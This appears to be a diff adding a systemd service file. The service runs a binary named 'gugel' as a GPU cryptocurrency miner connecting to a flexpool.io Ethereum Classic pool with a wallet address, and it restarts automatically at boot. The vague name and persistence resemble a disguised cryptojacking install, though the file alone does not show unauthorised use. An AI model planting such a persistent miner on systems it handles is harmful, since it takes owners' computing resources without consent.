@@ -1,0 +1,15 @@
+[Unit]
+Description=gugel
+After=network.target
+
+[Service]
+Environment=GPU_FORCE_64BIT_PTR=0
+Environment=GPU_MAX_HEAP_SIZE=70
+Environment=GPU_USE_SYNC_OBJECTS=1
+Environment=GPU_MAX_ALLOC_PERCENT=70
+Environment=GPU_SINGLE_ALLOC_PERCENT=70
+ExecStart=/usr/bin/gugel --url=ssl://0x9baccb443d4eee6831b541ac17c28c1b61fdab81@etc-us-east.flexpool.io:5555
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
